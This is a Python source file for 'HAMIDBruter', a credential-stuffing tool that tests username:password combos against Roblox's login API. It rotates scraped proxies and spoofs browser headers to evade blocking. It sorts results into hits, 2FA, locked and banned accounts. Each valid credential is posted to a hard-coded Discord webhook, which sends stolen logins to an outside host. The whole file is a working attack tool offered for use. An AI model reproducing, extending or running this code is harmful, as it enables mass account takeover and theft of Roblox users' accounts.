import os
import json
import random
import requests
from colorama import Fore
from concurrent.futures import ThreadPoolExecutor
from requests.adapters import HTTPAdapter
from urllib3.util.retry import Retry

webhookURL = "https://discord.com/api/webhooks/1249734897229103105/bjYpjE_6iLCt76U4iy0TDWaW8KaKScG3sg1tA137tzNA4enh-AxMSIr9RQZW5WIPgNmk"

def load_config():
    with open("config.json") as f:
        return json.load(f)

def fetch_proxies():
    url = "https://api.proxyscrape.com/v3/free-proxy-list/get?request=displayproxies&protocol=http&proxy_format=ipport&format=text&anonymity=Transparent&timeout=20000"
    response = requests.get(url)
    if response.status_code == 200:
        proxies = response.text.strip().split('\n')
        proxies = [proxy.strip() for proxy in proxies if proxy.strip()]
        with open("proxies.txt", "w") as f:
            f.write('\n'.join(proxies))
    else:
        print(f"Failed to fetch proxies: {response.status_code}")

def write_output(file, text):
    file_path = os.path.join(config["results_dir"], f"{file}.txt")
    with open(file_path, "a", encoding="utf-8", errors="ignore") as f:
        f.write(f"{text}\n")

def write_hits(combo):
    with open("hits.txt", "a", encoding="utf-8", errors="ignore") as f:
        f.write(f"{combo}\n")

def remove_combo_from_file(combo):
    with open(os.path.join("accounts.txt"), "r+") as f:
        lines = f.readlines()
        f.seek(0)
        for line in lines:
            if line.strip() != combo:
                f.write(line)
        f.truncate()


def send_webhook_to_another(status, combo):
    credential, password = combo.split(":", 1)
    data = {
        "content": f"<@506769994630168587>",
        "embeds": [{
            "title": f"New hit!",
            "color": 65280,
            "fields": [
                {"name": ":bust_in_silhouette: Username", "value": f"```{credential}```", "inline": True},
                {"name": ":closed_lock_with_key: Password", "value": f"```{password}```", "inline": True},
                {"name": ":lock: Combo", "value": f"```{combo}```", "inline": False},
            ],
            "footer": {
                "text": "HAMIDBruter v1.1.5 | made by hamidpis"
            }
        }]
    }
    requests.post(webhookURL, json=data)

def process_response(resp, combo):
    global STATS
    if "Incorrect username or password" in resp.text:
        STATS['INVALID'] += 1
        STATS['TOTAL'] += 1
        write_output("invalid", combo)
        remove_combo_from_file(combo)
    elif "Account has been locked." in resp.text or "Please use Social" in resp.text:
        STATS['LOCKED'] += 1
        STATS['TOTAL'] += 1
        write_output("locked", combo)
        remove_combo_from_file(combo)
    elif "You must pass the Security Question" in resp.text or "twoStepVerificationData" in resp.text:
        STATS['2FA'] += 1
        STATS['TOTAL'] += 1
        write_output("2fa", combo)
        remove_combo_from_file(combo)
    elif "isBanned\":true" in resp.text:
        STATS['BANNED'] += 1
        STATS['TOTAL'] += 1
        write_output("banned", combo)
        remove_combo_from_file(combo)
    elif "displayName" in resp.text:
        try:
            cookie = resp.cookies[".ROBLOSECURITY"]
            if cookie:
                STATS['HITS'] += 1
                STATS['TOTAL'] += 1
                write_output("hits", combo)
                send_webhook_to_another("Hit", combo)
                remove_combo_from_file(combo)
            else:
                STATS['HITS'] += 1
                STATS['TOTAL'] += 1
                write_output("hits", combo)
                send_webhook_to_another("Hit", combo)
                remove_combo_from_file(combo)
        except Exception as e:
            STATS['HITS'] += 1
            STATS['TOTAL'] += 1
            write_output("hits", combo)
            send_webhook_to_another("Hit", combo)
            remove_combo_from_file(combo)
    elif "Challenge is required to authorize the request" in resp.text:
        STATS['CAPTCHA'] += 1
        STATS['TOTAL'] += 1
        write_output("captcha", combo)
    print_progress()

def worker(combos):
    proxy = random.choice(proxies_list)
    
    headers = {
        'accept': 'image/avif,image/webp,image/apng,image/svg+xml,image/*,*/*;q=0.8',
        'accept-language': 'en-US,en;q=0.6',
        'referer': 'https://www.roblox.com/',
        'sec-ch-ua': '"Brave";v="123", "Not:A-Brand";v="8", "Chromium";v="123"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'image',
        'sec-fetch-mode': 'no-cors',
        'sec-fetch-site': 'same-site',
        'sec-gpc': '1',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36',
    }

    cookies = {
        'RBXEventTrackerV2': 'CreateDate=5/8/2024 10:01:00 AM&rbxid=&browserid=1715180460550006',
        'GuestData': 'UserID=-2035320897',
        'RBXImageCache': 'timg=JBnE3T2ZCyGGCAxhPLUVQPo84dwcRjboIULd8IA8OCjdjuhjKpMAOpI1LRftIQes83jVFL-nrmd02M12SG7lAdyiMPJymRclt_1HyLilfgiQe0wxaTBr9KEhtT2k9nYFJQRjrAq78-BaE9r7vOBH3VaMe4n-GZu-pZoElL2Flyan2SkfWsQdFWOqNUYQ0dHb4sW_O1jFdHulJk5svjIr-w',
        'RBXSource': 'rbx_acquisition_time=05/08/2024 15:01:03&rbx_acquisition_referrer=&rbx_medium=Social&rbx_source=&rbx_campaign=&rbx_adgroup=&rbx_keyword=&rbx_matchtype=&rbx_send_info=1'
    }

    session = requests.Session()
    retries = Retry(total=5, backoff_factor=0.1, status_forcelist=[500, 502, 503, 504])
    session.mount('https://', HTTPAdapter(max_retries=retries))

    for combo in combos:
        try:
            credential, password = combo.split(":", 1)
            resp = session.post(
                url="https://auth.roblox.com/v2/login",
                headers=headers,
                cookies=cookies,
                json={
                    "ctype": "Username",
                    "cvalue": credential,
                    "password": password
                },
                proxies={"https": f"http://{proxy}"},
                timeout=15
            )

            process_response(resp, combo)
            
            if "x-csrf-token" in resp.headers:
                headers["x-csrf-token"] = resp.headers["x-csrf-token"]
                resp = session.post(
                    url="https://auth.roblox.com/v2/login",
                    headers=headers,
                    cookies=cookies,
                    json={
                        "ctype": "Username",
                        "cvalue": credential,
                        "password": password
                    },
                    proxies={"https": f"http://{proxy}"},
                    timeout=15
                )
                process_response(resp, combo)
        except Exception as e:
            pass

    session.close()

def print_progress():
    print(f'\r{Fore.LIGHTWHITE_EX}[HAMIDBruter] {Fore.GREEN}TOTAL: {STATS["TOTAL"]} | {Fore.CYAN}HITS: {STATS["HITS"]} | {Fore.LIGHTMAGENTA_EX}2FA: {STATS["2FA"]} | {Fore.YELLOW}Locked: {STATS["LOCKED"]} | {Fore.RED}Invalid: {STATS["INVALID"]} | {Fore.YELLOW}Captcha: {STATS["CAPTCHA"]}', end='', flush=True)

if __name__ == '__main__':
    config = load_config()
    
    INPUT_DIR = config["input_dir"]
    RESULTS_DIR = config["results_dir"]
    PROXIES_FILE = "proxies.txt"
    COMBOS_FILE = os.path.join(INPUT_DIR, config["combos_file"])
    THREAD_COUNT = config["thread_count"]

    fetch_proxies()
    
    proxies_list = open(PROXIES_FILE, "r").read().splitlines()
    combos_list = list(set(line.strip() for line in open(COMBOS_FILE, "r", encoding="utf-8", errors="ignore").readlines()))
    
    STATS = {
        'TOTAL': 0,
        'HITS': 0,
        '2FA': 0,
        'LOCKED': 0,
        'BANNED': 0,
        'INVALID': 0,
        'CAPTCHA': 0
    }

    with ThreadPoolExecutor(max_workers=THREAD_COUNT) as executor:
        chunk_size = len(combos_list) // THREAD_COUNT
        combos_chunks = [combos_list[i:i + chunk_size] for i in range(0, len(combos_list), chunk_size)]
        executor.map(worker, combos_chunks)
